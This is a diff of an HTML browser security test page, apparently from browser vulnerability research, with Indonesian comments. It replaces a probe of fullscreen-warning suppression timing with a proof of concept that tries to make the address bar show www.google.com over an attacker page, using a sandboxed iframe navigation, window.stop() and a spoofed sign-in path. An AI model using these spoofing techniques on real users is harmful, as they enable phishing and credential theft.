@@ -1,32 +1,15 @@
-<!-- 11 | 2026 · toast fullscreen: mengukur JENDELA SUPRESI (menggantikan ide keyboard-lock yang SALAH ARAH)
-     KOREKSI  versi sebelumnya memakai keyboard.lock() untuk menahan Esc. Itu keliru:
-     Chrome menampilkan notice PERSISTEN justru ketika keyboard di-lock. Sumbu itu MENAIKKAN
-     kecurigaan, bukan menurunkannya. Dibuang, diganti knob yang benar.
-     KNOB YANG BENAR  banyak engine tidak menampilkan toast lagi kalau kamu masuk-fullscreen
-     LAGI segera setelah keluar - dianggap masih sesi yang sama. Kalau jendela supresi itu ada,
-     maka masuk-fullscreen KEDUA berlangsung TANPA satu pun pembantah di layar.
-     Yang dicari bukan "toast bisa disembunyikan" tapi BERAPA MILIDETIK jeda maksimum yang
-     masih menghasilkan supresi. Itu angka, dan angka itu isi laporannya.
-     PROSEDUR  masuk -> keluar -> tunggu D ms -> masuk lagi -> catat: toast muncul lagi atau tidak.
-     D diuji menurun: 3000, 2000, 1000, 500, 200, 0. Bounded, berhenti sendiri.
-     EXPECTED-SECURE  toast muncul di SETIAP masuk-fullscreen, berapa pun jedanya.  KELUAR  Esc. -->
-<button onclick="go()">Run 11 (6 putaran — pelototi toast tiap kali)</button>
-<pre id=g style="font:12px/1.7 monospace"></pre>
+<!doctype html><meta charset=utf-8>
+<!-- PREDIKAT: bar melukis www.google.com sementara dokumen top tetap milikku
+     ORACLE: klik tombol DI DALAM frame -> screenshot bar + panel REAL
+     CONTROL: hapus window.stop() -> nav commit normal
+     EXPECTED-SECURE: bar kembali ke URL nyata (atau tak pernah melukis target) saat nav dihentikan -->
+<h2>top document (attacker)</h2>
+<iframe id=fr sandbox="allow-scripts allow-top-navigation-by-user-activation"
+  srcdoc="<button onclick='parent.postMessage(1,`*`);top.location=`https://www.google.com/`'>go (opaque-origin initiator)</button>"></iframe>
+<pre id=p></pre>
 <script>
-var D = [3000, 2000, 1000, 500, 200, 0], i = 0, out = [];
-g.textContent = 'REAL ORIGIN: ' + location.href + '\n\nTiap putaran: catat TOAST MUNCUL atau TIDAK.';
-function say() { g.textContent = 'REAL ORIGIN: ' + location.origin + '\n\n' + out.join('\n') + '\n\nCatat manual: putaran mana toast berhenti muncul? Itu batas supresinya.'; }
-function go() { i = 0; out = []; cycle(); }
-function cycle() {
-  if (i >= D.length) { out.push('selesai.'); say(); return; }
-  var d = D[i];
-  document.documentElement.requestFullscreen().then(function () {
-    out.push('putaran ' + (i + 1) + ' — MASUK (jeda sebelumnya ' + d + ' ms)  >> toast muncul?'); say();
-    setTimeout(function () {
-      document.exitFullscreen().then(function () {
-        setTimeout(function () { i++; cycle(); }, d);
-      });
-    }, 2500);
-  }).catch(function (e) { out.push('putaran ' + (i + 1) + ' DITOLAK: ' + e.name + ' (butuh gestur — klik tombol lagi)'); say(); });
-}
+history.replaceState(0, '', '/accounts/signin/identifier');   // pre-spoof path, tetap same-origin
+function paint(){ p.textContent = 'REAL: ' + location.href + '\ninitiator: opaque (sandboxed srcdoc)'; }
+addEventListener('message', () => setTimeout(() => { window.stop(); paint(); }, 40));
+paint();
 </script>
